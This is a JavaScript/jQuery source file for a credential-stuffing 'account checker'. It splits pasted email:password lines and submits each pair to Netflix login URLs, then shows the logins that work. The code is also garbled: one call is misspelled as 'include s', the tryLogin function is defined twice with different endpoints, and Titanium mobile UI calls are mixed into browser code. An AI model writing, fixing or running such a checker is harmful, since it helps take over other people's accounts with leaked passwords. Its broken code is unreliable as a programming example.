$(document).ready(function () {
    $("button").click(function () {
        const comment = $.trim($("#comment").val());
        console.log(comment);
        logins = parseString(comment);
        console.log(logins);

        for (let i = 0; i < logins.length; i++) {
            const {email, password} = logins[i];
            console.log(email, password);

            let result = tryLogin(email, password);
            console.log(result);
            if (tryLogin(email, password) === true) {
                console.log("success!");
                //display logins
                let win = Ti.UI.createWindow({
                    backgroundColor: '#fff'
                });
                let label = Ti.UI.createLabel({
                    text: email + " " + password,
                    color: '#000',
                    top: 10, left: 10,
                    width: 250, height: 60
                });
                win.add(label);
                win.open();
                }
            }
    });

    function checkValidEmail(email) {
        const re = /\S+@\S+\.\S+/;
        return re.test(email);
    }

    function parseString(comment) {
        const lines = comment.split("\n");
        const result = [];
        lines.forEach(line => {
            const [email, password] = line.split(":");
            result.push({email, password});
        });
        return result;
    }
    function tryLogin(email, password) {
        const url = "https://www.netflix.com/fr/login";
        const xhr = new XMLHttpRequest();
        xhr.open("POST", url, false);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("userLoginId=" + email + "&password=" + password);
        return xhr.responseText.include s("Netflix");
    }

    function tryLogin(email, password) {
        if (!checkValidEmail(email)) {
            return false;
        }
            const xhr = new XMLHttpRequest();
        xhr.open("POST", "https://www.netflix.com/api/login", false);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify({
            email,
            password,
            rememberMe: true
        }));
        const response = JSON.parse(xhr.responseText);
        return response.status === 200;
    }
});

